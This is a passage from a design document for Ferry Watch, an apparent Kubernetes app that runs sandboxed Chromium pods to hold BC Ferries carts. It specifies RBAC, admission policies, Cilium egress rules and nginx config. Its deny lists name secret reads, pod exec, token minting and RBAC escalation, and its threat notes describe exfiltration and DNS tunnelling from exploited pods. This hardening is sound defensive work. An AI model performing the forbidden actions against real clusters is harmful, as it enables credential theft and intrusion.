**Granted to no app identity**, asserted by `kubectl auth can-i --as` in envtest (`tests/apiserver/`) and in
the post-deploy smoke, for both namespaces:
- `secrets` (any verb);
- `pods` update or deletecollection; `pods` patch for anyone but ferry-control (whose patches the VAP limits
  to one label); `pods` create in `ferry-watch`; every `pods/*` subresource (exec, attach, portforward, proxy,
  log, ephemeralcontainers, eviction, binding, resize, status);
- `deployments`, `replicasets`, `statefulsets`, `daemonsets`, `jobs`, `cronjobs` (any write);
- `services` and `services/proxy`, `nodes/proxy`, `endpoints`, `endpointslices`, `serviceaccounts/token`;
- `configmaps` writes, `poddisruptionbudgets`, `namespaces`, `networkpolicies`, `ciliumnetworkpolicies`,
  `httproutes`, `gateways`, `referencegrants`, `securitypolicies`, `envoyextensionpolicies`;
- `resourcequotas`, `limitranges`, `priorityclasses`, `admissionregistration.k8s.io/*`, `rbac.*` (including
  bind, escalate, impersonate), `external-secrets.io/*`, `apiextensions.k8s.io/*`, `events`, and any
  wildcard.

`system:auth-delegator` is not used, because it also grants SubjectAccessReview.

### 7.4 Browser pod template (the only shape admitted)

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: fw-3f9c0a1b2c3d4e5f-g7                  # fw-<trip16>-g<gen>
  namespace: ferry-watch-browsers
  labels:
    app.kubernetes.io/name: ferry-browser
    app.kubernetes.io/managed-by: ferry-watch-control
    ferry-watch.io/trip: 3f9c0a1b2c3d4e5f
    ferry-watch.io/owner: u5yq2kz7m4c3x8a1b2d3e   # 20-char uid; == FW_OWNER
    ferry-watch.io/pod: fw-3f9c0a1b2c3d4e5f-g7
    ferry-watch.io/gen: "7"
    ferry-watch.io/egress: allowlist             # always at create; only ferry-control flips it to hold (§7.6)
  annotations: {fluentbit.io/exclude: "true"}  # + kubernetes.io/egress-bandwidth if S-CIL ok
  # no ownerReferences: a bare pod (talosctl drains bare pods; the descheduler skips them)
spec:
  hostname: fw-3f9c0a1b2c3d4e5f-g7               # DNS: <hostname>.browsers.ferry-watch-browsers.svc.cluster.local
  subdomain: browsers
  serviceAccountName: ferry-browser
  automountServiceAccountToken: false
  enableServiceLinks: false
  hostUsers: false                               # only if params.requireUserNamespace == "true" (optional Talos sysctl applied)
  restartPolicy: Never
  priorityClassName: ferry-browser
  activeDeadlineSeconds: 93600
  terminationGracePeriodSeconds: 90
  dnsPolicy: ClusterFirst
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    runAsGroup: 1001
    seccompProfile: {type: RuntimeDefault}       # {type: Localhost, localhostProfile: profiles/fw-chromium.json} only if params.sandbox == "true"
  tolerations:
  - {key: node.kubernetes.io/not-ready, operator: Exists, effect: NoExecute, tolerationSeconds: 60}
  - {key: node.kubernetes.io/unreachable, operator: Exists, effect: NoExecute, tolerationSeconds: 60}
  containers:
  - name: browser
    image: ghcr.io/mchestr/ferry-watch-browser@sha256:<params.allowedImages[0]>
    env:                                          # literal values only: exactly these 8 (+ params.optionalEnv, empty in v1)
    - {name: FW_TRIP_ID, value: 3f9c0a1b2c3d4e5f}
    - {name: FW_OWNER, value: u5yq2kz7m4c3x8a1b2d3e}
    - {name: FW_POD_NAME, value: fw-3f9c0a1b2c3d4e5f-g7}
    - {name: FW_DEADLINE_AT, value: "1797000000"}  # epoch s = create + 93600
    - {name: FW_HUB_URL, value: "ws://ferry-control.ferry-watch.svc.cluster.local.:8766/agent/v1"}   # == params
    - {name: FW_VNC_PUBKEYS, value: "k1:ed25519:…"}                                                    # == params
    - {name: FW_VNC_ORIGIN, value: https://ferry-checkout.chestr.dev}                                        # == params
    - {name: FW_SANDBOX, value: "0"}                                                                    # == params
    ports: [{name: vnc, containerPort: 6080}, {name: probe, containerPort: 8080}]
    startupProbe:   {httpGet: {path: /livez, port: probe}, periodSeconds: 10, failureThreshold: 90}
    livenessProbe:  {httpGet: {path: /livez, port: probe}, periodSeconds: 30, failureThreshold: 4}
    readinessProbe: {httpGet: {path: /readyz, port: probe}, periodSeconds: 15}
    resources:
      requests: {cpu: <params.cpuRequest>, memory: <params.podMemory>, ephemeral-storage: 64Mi}
      limits:   {cpu: 1500m, memory: <params.podMemory>, ephemeral-storage: 256Mi}
    securityContext: {allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: {drop: [ALL]}}
    terminationMessagePolicy: File               # one enum line only (C30)
    volumeMounts:
    - {name: tmp, mountPath: /tmp}
    - {name: shm, mountPath: /dev/shm}
    - {name: hub-token, mountPath: /var/run/fw, readOnly: true}
  volumes:
  - {name: tmp, emptyDir: {medium: Memory, sizeLimit: 512Mi}}
  - {name: shm, emptyDir: {medium: Memory, sizeLimit: 256Mi}}
  - name: hub-token
    projected: {sources: [{serviceAccountToken: {audience: ferry-watch-agent, expirationSeconds: 600, path: token}}]}
```

The pod is **Burstable**, not Guaranteed: memory request equals limit, but CPU request (default 200m) is below
the 1500m limit. Memory request = limit means node-pressure eviction ranks it last among Burstable pods
(usage never exceeds request), but under a node-level OOM the kernel kills it early (`oom_score_adj` about
985), which protects the owner's household workloads at the cost of the cart (R8).

`/livez` fails only when the watch loop has been wedged for more than 15 min *and* no cart is held. `/readyz`
reports only local health: display, Chromium, loop and lockdown. It never reports control-plane
connectivity.

### 7.5 Admission (GitOps-owned VAPs; `failurePolicy: Fail`; bindings `validationActions: [Deny]`)

Params come from ConfigMap `ferry-browser-policy` in `ferry-watch-browsers`, rendered from Helm values, with
`parameterNotFoundAction: Deny`. Keys: `allowedImages` (as built, the one browser image, `repository:tag@digest`,
which changes in the same release as ferry-control's config);
`hubUrl`, `vncPubkeys`, `vncOrigin`, `podMemory`, `cpuRequest`, `maxDeadline` (93600); `requireUserNamespace`,
`sandbox`, `seccompProfile` (all off in v1; the optional hardening turns them on, R2); `optionalEnv` (empty
in v1, §5.7); `controlSA`, `breakGlassGroup`.

| VAP | Matches | Enforces | From |
|---|---|---|---|
| `fw-browser-pod` | pods CREATE in ns `ferry-watch-browsers` (all requesters) | Requester is `params.controlSA` or in `params.breakGlassGroup`, and the pod is exactly §7.4 (abridged CEL below) | M1 |
| `fw-browser-pod-lock` | pods UPDATE (which includes patch); `pods/ephemeralcontainers` UPDATE; `pods/exec`, `pods/attach`, `pods/portforward` CONNECT, in that namespace | Deny unless break-glass, with two exceptions. (1) **The egress label (round 3):** `params.controlSA` may UPDATE a pod when the only difference from `oldObject` is `metadata.labels['ferry-watch.io/egress']` moving between `allowlist` and `hold`: `object.spec == oldObject.spec`, every other label key and value equal, annotations, ownerReferences and finalizers equal. (2) UPDATE by `system:node:*` and the named kube-system controllers (`generic-garbage-collector`, `node-controller`, `pod-garbage-collector`; Talos runs kube-controller-manager with `--use-service-account-credentials`). **Not** a blanket `system:` exemption. Status writes go through `pods/status` and are unaffected. Positive cases are proven in kind-lite and the post-deploy smoke, not envtest (no kubelet or GC there); the label exception and its denials (image, deadline, tolerations, another label, an annotation, `hold` by any other identity) are envtest cases. | M1 |
| `fw-ns-objects` | CREATE/UPDATE/DELETE of Secrets, ConfigMaps, Services, Endpoints, EndpointSlices, NetworkPolicies, CiliumNetworkPolicies, Roles, RoleBindings, ServiceAccounts, HTTPRoutes, SecurityPolicies, ExternalSecrets, PushSecrets, ResourceQuotas, LimitRanges, PodDisruptionBudgets, `apps/*` (Deployments, ReplicaSets, StatefulSets, DaemonSets) and `batch/*` (Jobs, CronJobs) in both ferry namespaces, plus pods CREATE in `ferry-watch` | Deny for every `system:serviceaccount:ferry-watch:*` and `system:serviceaccount:ferry-watch-browsers:*` identity. System controllers and Flux are unaffected. This is defence in depth; the guarantee is "no ferry SA has any verb except those in §7.3", proven by the `can-i` matrix (§11.4). | M2 |

`fw-browser-pod-lock` moves to M1 (it was in the old M3): ferry-control now holds `pods` patch for the
egress label, and without the VAP that verb would let a compromised operator swap a live pod's image or
change anything else a pod update allows, so the VAP is the guarantee, not a second fence. `fw-ns-objects`
backs up RBAC that already denies the same actions (C6), so it ships in M2, before the first non-household
invitee. The draft's `fw-browser-pod-creator` is folded into `fw-browser-pod`; `fw-hold-pdb` and
`fw-anchor-guard` are gone with the PDBs and the anchor (§7.8).

Abridged CEL for `fw-browser-pod`. The real policy uses `has()` guards, and every line has an envtest denial
case:
- `request.userInfo.username == params.controlSA || params.breakGlassGroup in request.userInfo.groups`.
- `object.metadata.name.matches('^fw-[a-f0-9]{16}-g[0-9]{1,6}$')`, and each label equals its derived value;
  `ferry-watch.io/owner.matches('^u[a-z2-7]{19}$')`; `ferry-watch.io/egress == 'allowlist'` at create.
- Annotation keys are a subset of `{fluentbit.io/exclude, kubernetes.io/egress-bandwidth}`; this denies
  `k8s.v1.cni.cncf.io/networks` (Multus), among others.
- No `ownerReferences`, no `finalizers`.
- One container. No init or ephemeral containers. Image is in `params.allowedImages`, which must contain
  `@sha256:`.
- No `command`, `args`, `workingDir`, `lifecycle`, `envFrom` or `securityContext.capabilities.add`. Probes are
  `httpGet` on `probe` only.
- Env names are exactly the 8, with no `valueFrom`, plus optionally a name that is both in
  `params.optionalEnv` and in the policy's own short candidate list (today only `FW_CHECKOUT_MODE`, with a
  literal value matching `^[a-z_]{1,16}$`). So a future login mode can be admitted by a params change, while
  a params edit alone can never admit `NODE_OPTIONS`, `DEBUG` or anything else. `FW_TRIP_ID` and
  `FW_POD_NAME` equal the label and the name; `FW_OWNER` equals the owner label; `FW_HUB_URL`,
  `FW_VNC_PUBKEYS`, `FW_VNC_ORIGIN` and `FW_SANDBOX` equal their params; `FW_DEADLINE_AT` matches
  `^[0-9]{10}$`.
- Volumes are exactly `{tmp, shm}` (emptyDir, Memory, with the size limits) and `hub-token` (one projected
  token, audience `ferry-watch-agent`, expiry ≤ 600). Mounts are at the exact paths, with no `subPath` or
  `subPathExpr`.
- Pod fields: `serviceAccountName == 'ferry-browser'`, `automountServiceAccountToken == false`,
  `enableServiceLinks == false`, `restartPolicy == 'Never'`; `hostname == name`, `subdomain == 'browsers'`,
  `priorityClassName == 'ferry-browser'`, `dnsPolicy == 'ClusterFirst'`; `0 < activeDeadlineSeconds <=
  params.maxDeadline`, `terminationGracePeriodSeconds == 90`; `hostUsers == false` whenever
  `params.requireUserNamespace == 'true'`; the seccomp profile is `RuntimeDefault`, or exactly
  `Localhost/params.seccompProfile` when `params.sandbox == 'true'`.
- None of `hostAliases`, `dnsConfig`, `nodeName`, `nodeSelector`, `affinity`, `runtimeClassName`,
  `shareProcessNamespace`, `hostNetwork`, `hostPID`, `hostIPC`, `resourceClaims`, `overhead` or
  `schedulingGates`.
- Resources exactly as §7.4 with `params.podMemory` and `params.cpuRequest`. `readOnlyRootFilesystem`,
  `runAsUser == 1001`, drop `[ALL]`, `terminationMessagePolicy == 'File'`.

PSA `restricted` stays on as an independent fence (it allows `Localhost` seccomp profiles).

*As built* (the admission policies in home-cluster's HelmRelease, `deploy/helmrelease.yaml` here, proven by
`tests/apiserver/` on a real 1.36 API server):
the owner label is `^[a-z0-9]{20}$`, the users table's own rule. Quantities compare with the quantity library
(`compareTo`), so `1.5Gi` and `1536Mi` are the same. Fields the API server defaults (probe timings,
`terminationMessagePath`, the token volume's mode) are checked where they matter and otherwise left alone.
In `fw-browser-pod-lock` the label exception is a ternary on ferry-control's plain pod update: an error inside
a policy variable fails the whole expression (a plain update has no `subResource` key at all), which would
otherwise refuse even break-glass. CONNECT rules do match `pods/exec`, `attach` and `portforward`. Changes that
Pod Security admission or the ServiceAccount plugin refuse first (a `hostPath` volume, an init container
without a security context, another service account) are refused by the policy too.
MutatingAdmissionPolicy is not used: ferry-control renders the full spec, so tests see exactly what runs.

### 7.6 Network policies

Each namespace has a k8s `NetworkPolicy` default-deny for ingress and egress on `podSelector: {}`, plus the
allow rules below. Peers always pair an immutable namespace name with a podSelector. Rules that name Cilium
entities (`kube-apiserver`, `host`) or use `toFQDNs` are CiliumNetworkPolicies.

**DNS.** home-cluster sets `dnsProxy.dnsRejectResponseCode: nameError` in the Cilium values, so a name the
policy does not allow gets NXDOMAIN and glibc keeps walking the search list instead of stopping (§2.2). Every
in-cluster name in our config is fully qualified with a trailing dot (`ferry-control.ferry-watch.svc.cluster.local.`,
`postgres17-rw.database.svc.cluster.local.`, `smtp-relay.default.svc.cluster.local.`), so the search list is not
walked at all. S-CIL proves both with the agent's own Python resolver and with Chromium's resolver.

| Pods | Ingress allowed | Egress allowed |
|---|---|---|
| browser pods (CNP `fw-browser-egress`, always) | :6080 from `ferry-watch/vnc-edge` (add the `kube-apiserver` entity only if S-CIL shows vnc-edge→pod is SNATed cross-node; the gate's crypto is load-bearing either way). :8080 from entity `host` (kubelet probes). | kube-dns :53 with `rules.dns` matchName/matchPattern for `bcferries.com`, `*.bcferries.com`, `queue-it.net`, `*.queue-it.net` and `ferry-control.ferry-watch.svc.cluster.local`. `toFQDNs` (same external names) on TCP 443. `ferry-watch/ferry-control` :8766. **Nothing else**: no other world address, LAN, nodes, kube-apiserver, other pods, smtp-relay or observability. |
| browser pods labelled `ferry-watch.io/egress: hold` (CNP `fw-browser-hold-egress`, added on top) | — | kube-dns :53 with `rules.dns` `matchPattern: "*"`. `toCIDRSet` `0.0.0.0/0` except `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `169.254.0.0/16`, `127.0.0.0/8`, `0.0.0.0/8`, `224.0.0.0/4`, `240.0.0.0/4`, on TCP 443 only. Cilium's CIDR rules select only the `world` identity, never cluster identities (pods, `host`, `remote-node`, `kube-apiserver`), so in-cluster destinations stay denied by the default deny. |
| ferry-web | :8765 from envoy-external Envoy pods plus the `kube-apiserver` entity (SNAT); defence in depth only, since the app trusts no identity header (C29). :9090 from Prometheus. | Postgres (`database/postgres17-rw` :5432). smtp-relay :2525. The OIDC issuer: `toEndpoints` for `networking` pods labelled `gateway.envoyproxy.io/owning-gateway-name: envoy-external` on TCP 10443 (`auth.chestr.dev` resolves to the envoy-external LB address; with kube-proxy replacement the policy sees the Envoy pods, on the port EG shifted by 10000; §6.2.2). kube-dns with a DNS rule for the Postgres and smtp-relay names, `auth.chestr.dev`, the Web Push endpoints (`fcm.googleapis.com`, `*.push.apple.com`, `updates.push.services.mozilla.com`, `*.notify.windows.com`) and `www.bcferries.com` (terminal names); `toFQDNs` for the external names on 443. **Denied:** observability, both browser ports, every other envoy-external destination port. |
| ferry-control | :8766 from browser pods (`ferry-watch-browsers` + label); add the `kube-apiserver` entity only if S-CIL demands it. :9090 from Prometheus. | kube-apiserver entity :6443. Postgres. kube-dns. |
| vnc-edge | :8080 from envoy-external Envoy pods plus the `kube-apiserver` entity | kube-dns. Browser pods :6080. |
| db-init, db-migrate Jobs; cnpg `pg-backups` CronJob | none | Postgres. kube-dns. The NFS backup target (pg-backups only). |

home-cluster adds one rule to smtp-relay's NetworkPolicy admitting `ferry-watch/ferry-web` on 2525.

**Hold egress (owner, round 3: "open public HTTPS egress while a cart is held").** Any bank's 3-D Secure
page must load during checkout, and banks use many hosts, so a learned allowlist (the round-2 plan, with
S-3DS) would always lag. Two ways were considered:

| | **A: allowlist always, plus a hold policy keyed on a label (chosen)** | B: public HTTPS always |
|---|---|---|
| Mechanism | `fw-browser-egress` as above for every pod; `fw-browser-hold-egress` adds public 443 and any DNS name for pods labelled `ferry-watch.io/egress: hold`. ferry-control flips the label at READY and back at hold end (§6.6); the pod-lock VAP lets it change that label and nothing else (§7.5); the agent has no say. | One policy: kube-dns for any name, public 443 for every pod, all the time. No label, no patch verb. |
| Code running in a pod (A3) | Reaches any public HTTPS host only while that pod holds a cart (at most the 60 min hard cap, and only with a real cart); confined to BC Ferries and Queue-it for the rest of its up-to-26 h life | Reaches any public HTTPS host for the pod's whole life, so an exploited pod is an open proxy and exfiltration path from the home IP for up to a day, and DNS tunnelling is always open |
| A tenant (A2) | Can browse other sites, through links, only during their own hold | Same: VNC exists only during holds |
| New moving parts | `pods` patch for ferry-control (fenced by the VAP, which moves to M1), a second CNP, retries and a fail-closed delete in the fleet loop; S-CIL checks the flip | None |
| If the flip fails or lags | The payment or bank page doesn't load (R16): detected, retried, alerted | Nothing to fail |
| Effort | about 2-2.5 days in M1, about half of it the pod-lock VAP moved from the old M3 | about 0.5 day |

**Chosen: A.** Most of a pod's life is unattended watching, when nothing legitimate needs any host but BC
Ferries and Queue-it; B would hand every exploited pod the open internet for that whole time, for a saving of
about 2 days. A's cost is one narrowly fenced verb, and its failure mode is visible and fails closed toward
less egress. B stays the documented fallback if S-CIL shows label changes don't re-apply policy within a few
seconds or break the pod's established connections. Either way: private, CGNAT, link-local (including the
metadata address), loopback, cluster, node, smtp-relay and observability destinations are denied in every
state, and only TCP 443 opens (no QUIC: `QuicAllowed=false`). The post-deploy smoke tests both states (§11.4).

### 7.7 PriorityClass, ResourceQuota, LimitRange

GitOps-owned; no app identity has verbs on them. Sizes come from the capacity table (§8.4).

- `PriorityClass ferry-browser`: `value: 0`, `preemptionPolicy: Never`. Browsers never preempt the owner's
  workloads, and default-priority pods can't preempt a holding browser (a negative value would let them).
- `ResourceQuota browsers` (scopeSelector PriorityClass `ferry-browser`), rendered from values:
  - `pods = maxBrowsersTotal + 1` (one terminating predecessor);
  - `requests.memory = limits.memory = (maxBrowsersTotal + 1) × podMemory`, computed in the HelmRelease from
    those values (as built, §7.10), so it can't drift; `maxBrowsersTotal` is sized from the memory budget (§8.4);
  - `requests.cpu = (maxBrowsersTotal + 1) × cpuRequest` (the draft's fixed `2` capped the fleet at 20).

  A quota hit means an accounting bug, and it pages the admin.
- `ResourceQuota require-deadline` (scope `NotTerminating`): `pods: 0`. Every pod must carry
  `activeDeadlineSeconds`.
- `ResourceQuota objects`: `services: 1` (the headless `browsers`), `configmaps: 2` (params and the
  auto-created `kube-root-ca.crt`), `secrets: 0`, `count/poddisruptionbudgets.policy: 0`.
- `LimitRange`: container max memory = `podMemory` (as built), max cpu 1500m, max ephemeral-storage 256Mi.

### 7.8 Node drains, without PDBs or an anchor

**What Talos does.** A tuppr `TalosUpgrade` runs `talosctl upgrade`, which cordons and drains the node with
the kubectl drain library (`Force: true`, so bare pods are evicted; `GracePeriodSeconds: -1`, so our 90 s
grace applies) and a 5-minute default timeout. If eviction is still blocked at the timeout, the upgrade fails
without rebooting and the node stays cordoned; tuppr retries twice and marks the upgrade Failed (§2.2).

**What v1 does** (owner, round 3: accepted; hold protection stays in the backlog).
- Browser pods are bare (no ownerReferences). talosctl evicts them; the descheduler's default evictor skips
  them (and the namespace is excluded too). No anchor ConfigMap, so no GC mass-delete hazard and no guard
  that would block Helm upgrades or uninstall.
- No hold PDB. On cordon, the fleet loop drains Watching pods on that node and recreates them elsewhere.
  Holding pods are evicted by the drain; the eviction delivers SIGTERM, the agent empties and verifies the
  cart (or leaves it to BC Ferries' timer if payment is in progress), and the user gets
  `cart_released{maintenance}`. The upgrade proceeds in seconds.
- **Runbook:** Talos bumps arrive as Renovate PRs that the owner merges. Before merging, turn on **Pause
  carting** on the admin Fleet page (no new holds; existing ones run out within the hard cap) and merge when
  the Holds panel is empty, or merge anyway and accept the releases.

**Later (M4, optional).** To make drains wait for holds: set `policy.drainTimeout: 70m` and
`policy.timeout: 100m` on the home-cluster TalosUpgrade (tuppr's Job deadline is `timeout + 600 s`), give
ferry-control `poddisruptionbudgets` create/delete in the browser namespace, reintroduce a `hold-<pod>` PDB
(`minAvailable: 1`, `unhealthyPodEvictionPolicy: AlwaysAllow`) and the `fw-hold-pdb` VAP, and prove it with a
real TalosUpgrade on one node. An alternative is a tuppr `healthChecks` entry that blocks the upgrade while
holds exist (tuppr re-checks before each node); that needs a spike. A static never-evict PDB is never used: it
would fail every upgrade.

### 7.9 vnc-edge

The image `ferry-watch-vnc-edge` is `nginxinc/nginx-unprivileged` by digest. It adds:
- the KasmVNC `www` files extracted unmodified from the same sha256-checked deb (`Dockerfile:20-32`);
- one inserted line in `vnc.html`: `<script src="/fw/shim.js"></script>` before the client's module script;
- `/fw/shim.js` (about 60 lines) and the landing page `/fw/landing.html` (about 60 lines);
- a CSP computed at image build from the shipped `vnc.html` (the hash of its one inline `<script>`).

The client's minified bundle is **not** patched. KasmVNC 1.5.0's client reads its settings from the URL hash
before the query (`initSetting("path","websockify")`, `reconnect`, `reconnect_delay`, `idle_disconnect`), and
opens its socket with one `new WebSocket(url, protocols)` call. The shim wraps `window.WebSocket` for URLs
matching `^wss://ferry-checkout\.chestr\.dev/t/[a-f0-9]{16}/g/[0-9]{1,6}/ws$` only and sets the protocols to
`["binary", "fw.n1.<N>"]`, plus `fw.t1.<ticket>` while a ticket is pending; it drops the ticket after the
first successful open. If the client gives up reconnecting before the hold deadline it knows from `disp`, the
shim reloads `vnc.html` with back-off (1, 2, 5, 10 s), so retries are effectively uncapped until the deadline.
The landing page sets
`#path=t/<trip>/g/<gen>/ws&autoconnect=1&reconnect=1&reconnect_delay=1000&idle_disconnect=120` and shows the
sailing and deadlines with `textContent`, plus a static note: "Check out as a guest. Don't sign in to BC Ferries
here: it doesn't accept a sign-in while a cart is held" (§5.7). If the fragment's ticket has already expired (a
slow load) and this device holds no lock yet, it sends the user back to `https://ferry.chestr.dev/c/<trip>` to
mint again; with no ticket and no stored `N` it shows only a link back to the dashboard. A CI test drives the
stock client in headless Chromium against a fake gate and asserts the path and subprotocols, so a KasmVNC bump
that changes this fails CI.

```nginx
map $http_upgrade $connection_upgrade { default upgrade; '' close; }
log_format noargs '$remote_addr [$time_local] "$request_method $uri" $status $body_bytes_sent $request_time';
server {
  listen 8080; access_log /dev/stdout noargs; server_tokens off;
  resolver kube-dns.kube-system.svc.cluster.local valid=5s ipv6=off;
  add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'sha256-<build>' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self' wss://ferry-checkout.chestr.dev; worker-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'" always;
  add_header Referrer-Policy no-referrer always; add_header X-Content-Type-Options nosniff always;
  add_header Cache-Control no-store always;
  location ~ "^/t/[a-f0-9]{16}/g/[0-9]{1,6}/$" { root /usr/share/fw-vnc; try_files /fw/landing.html =404; }
  location = /vnc.html { root /usr/share/fw-vnc; }
  location ~ "^/(assets|app|core|fw)/" { root /usr/share/fw-vnc; }
  location ~ "^/t/(?<trip>[a-f0-9]{16})/g/(?<gen>[0-9]{1,6})/ws$" {
    if ($http_upgrade != "websocket") { return 400; }
    proxy_pass http://fw-$trip-g$gen.browsers.ferry-watch-browsers.svc.cluster.local:6080/ws;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade;
    proxy_set_header Cookie ""; proxy_set_header Authorization "";
    proxy_hide_header Set-Cookie; add_header Content-Security-Policy "sandbox" always;
    proxy_buffering off; proxy_read_timeout 6100s; proxy_send_timeout 6100s;
    proxy_intercept_errors on; error_page 502 503 504 =410 /gone.html;
  }
  location = /gone.html { root /usr/share/fw-vnc; }   # "No checkout is open for this trip. Open Ferry Watch."
  location / { return 404; }
}
```

- `'wasm-unsafe-eval'` allows the client's QOI decoder worker to compile WebAssembly (it does not allow JS
  `eval`); S-VNC-lite checks whether disabling QOI is preferable. The settings panel's inline `onchange` handlers
  are blocked by this CSP, which only stops some slider labels updating.
- `connect-src` names `wss://ferry-checkout.chestr.dev` explicitly because some Safari versions do not match
  `wss:` to `'self'`.
- The HTTPRoute is static and lives in the chart: host `ferry-checkout.chestr.dev`; parentRef
  `networking/envoy-external`, `sectionName: https`; `RequestHeaderModifier remove [Cookie, Authorization]`;
  backend `vnc-edge:8080`; annotation `gatus.home-operations.com/enabled: "false"`. Envoy's route idle timeout
  is already disabled cluster-wide (`BackendTrafficPolicy requestTimeout: 0s`, `envoy.yaml:169`).
- vnc-edge stays stock and logic-free: no app code, no secrets, no Lua, so its attack surface is nginx and a
  static directory (§4.5).

*As built* (`vnc-edge/`, tested by `tests/browser/test_checkout_edge.py`): KasmVNC 1.5.0's client builds its
socket URL with the default port (`wss://ferry-checkout.chestr.dev:443/t/.../ws`), so the shim compares the
parsed URL (same host as the page, the checkout's socket path, no query) instead of the literal pattern above.
The client checks the socket's own prototype for the WebSocket members, so the shim returns a real `WebSocket`
from a wrapper function rather than a subclass. `connect-src` also lists `data:`, which the client fetches to
probe the browser's video decoders (a `data:` URL never leaves the page). The landing page keeps the pending
ticket in the tab's sessionStorage, strips it from the address bar, and opens the viewer after two seconds or
on "Open checkout". The client's request for `/package.json` gets the 404 every unlisted path gets.

### 7.10 Deployment layout and the home-cluster split

There is no Ferry Watch chart (owner, after M1's build: "use app-template to deploy, not a custom chart").
home-cluster deploys it with the app-template it uses everywhere, as one HelmRelease. This repo keeps a copy at
`deploy/helmrelease.yaml`, renders it in CI the way helm-controller does (`tests/deploy.py`, app-template 5.3.0),
runs kubeconform on the result, and proves its admission policies and RBAC on a real API server
(`tests/apiserver/`). A change to either copy goes to both; with `FW_HOME_CLUSTER` set, `tests/test_deploy.py`
checks they match.

```
kubernetes/apps/ferry-watch/                   namespace ferry-watch, components/common
  ferry-watch/
    ks.yaml                                    components/cnpg (APP=ferrywatch), dependsOn cloudnative-pg-cluster,
                                               wait: true
    README.md                                  1Password fields, release values, cutover, key rotation
    app/externalsecret.yaml                    Secret ferry-watch: ticket key, VAPID key, OIDC client id and
                                               secret, the two role passwords
    app/helmrelease.yaml                       app-template, upgrade.strategy RetryOnFailure, timeout 10m
      ferry.*                                  hosts, the browser image, ferry-control's and ferry-web's configs
      controllers                              ferry-web, ferry-control (Recreate), vnc-edge (RollingUpdate, 2),
                                               db (pre-install/pre-upgrade hook Job)
      configMaps                               both configs, and the hook's copy of ferry-control's
      service, route                           three Services; the dashboard and checkout HTTPRoutes
      networkpolicies                          default deny for the release's pods; per-workload policies
      rawResources                             the browser namespace and everything in it, ferry-control's RBAC,
                                               the PriorityClass, the three admission policies and bindings
```

- **One source of values.** Each process's `config.json` is `toPrettyJson` of `ferry.control` or `ferry.web`,
  plus the image, origins, base URL and redirect URI derived from `ferry.browserImage` and `ferry.hosts`. The
  admission policy's parameters are templated from the same values. The browser quota and the LimitRange's
  memory maximum are computed from `podMemory`, `cpuRequest` and `maxBrowsersTotal`, so there is no separate
  budget to keep in step. `tests/apiserver/test_render.py` checks the parameters against the config.
- **The render refuses** any of the three images without a digest, an empty `vncPubkeys`, a `podMemory` not in Mi
  and a `cpuRequest` not in millicores. home-cluster's flux-local therefore fails until a release fills them in.
- **One HelmRelease, two namespaces.** `rawResources` keep `metadata.namespace`, so the browser namespace's
  objects come from the release in `ferry-watch`. Flux's `targetNamespace` rewrites only the HelmRelease
  itself. The browser namespace gets no `components/common`: its object quota allows no Secret. It is kept
  on uninstall.
- **Selectors use app-template's labels**: `app.kubernetes.io/instance: ferry-watch` plus
  `app.kubernetes.io/controller: <id>`. The release namespace's default deny selects the instance label, so
  components/cnpg's pg-backups CronJob is not fenced.
- **The db Job**: the stock `postgres-init` (the only holder of the superuser password) as an init container,
  then `ferry-control migrate` as the owner role. It uses the namespace's `default` ServiceAccount, because
  release ServiceAccounts don't exist yet when a pre-install hook runs. Its config is a hook copy of
  ferry-control's.
- **The browser image** is `repository:tag@sha256:digest`. The digest is what runs, and `pods.py` accepts the
  tag. Renovate bumps it together with the control and edge images (one group).
- **The OIDC client id** is Authelia-generated and lives in 1Password beside the secret. ferry-web reads it
  from the Secret (`FW_OIDC_CLIENT_ID_FILE`), so the values don't name it. Authelia enables the client only once
  its fields reach Authelia's Secret, so a missing field can't stop Authelia.
- **The checkout key carries its id** (`k1:<key>`, from `ferry-web keys`), so a rotation's switch is one 1Password
  edit. `ferry.web.checkout.keyId` is only for a key stored without one.
- **The Secret's keys**: with a template, ESO writes only the templated keys. `tests/test_deploy.py` checks that
  every key the pods read from Secret `ferry-watch` is one the ExternalSecret (copied as `deploy/externalsecret.yaml`)
  writes.
- **Running beside the single-tenant app**: the dashboard runs on `ferry-next.chestr.dev` until the cutover
  (§12.5) moves `ferry.hosts.dashboard`.

**Outside the ferry-watch directory, home-cluster has:**
- CNPG managed roles `ferrywatch_web` and `ferrywatch_control` in `database/cloudnative-pg/cluster/cluster17.yaml`.
  Their password ExternalSecrets are in `database/cloudnative-pg/roles/`, in a Kustomization without `wait`, so
  a missing 1Password field holds back only Ferry Watch.
- The Authelia OIDC client and its `ferry-watch` authorization policy (§6.2.3), and Authelia's ExternalSecret
  entries.
- Cilium `dnsProxy.dnsRejectResponseCode: nameError`.
- The smtp-relay ingress rule for ferry-web.
- A Silence for `OomKilled`, `KubePodNotReady`, `KubePodCrashLooping`, `KubeContainerWaiting` and `KubeQuota*`
  in `ferry-watch-browsers`.
- Fluent Bit's `exclude_path` for the browser namespace.
- The descheduler exclusion on `RemoveFailedPods`, the only plugin that can touch a bare pod.
- A Cloudflare configuration rule turning Rocket Loader and email obfuscation off on the ferry hosts.
- Renovate: a PR (never automerge) for `/ferry-watch/`, and the three images grouped.
- Not yet: the GrafanaDashboard, the PrometheusRule and the PodMonitors (nothing exports metrics), and the
  `authorization_policies` for the other OIDC clients and the lldap group (M2, §6.2).
- Optional (backlog, the owner's call): the Talos `user.max_user_namespaces` sysctl and the
  `machine.seccompProfiles` entry, applied per node (R2).

**Dropped in round 2:** the ext-auth SecurityPolicy, the ReferenceGrant entry for `ferry-watch`, the Authelia
`access_control` rule for the ferry hosts and the gatus forged-header canary (identity is app-native OIDC).

**Dropped from the draft:** the EnvoyExtensionPolicy Lua filter (not needed: the app sets no cookie), the
ClusterSecretStore `spec.conditions` (over-built: a mistake there cuts every namespace off from its secrets,
and nothing in `ferry-watch-browsers` can create an ExternalSecret anyway), the warmer DaemonSet (its
long-running container referenced only `pause`, so the browser image could still be garbage-collected; cold
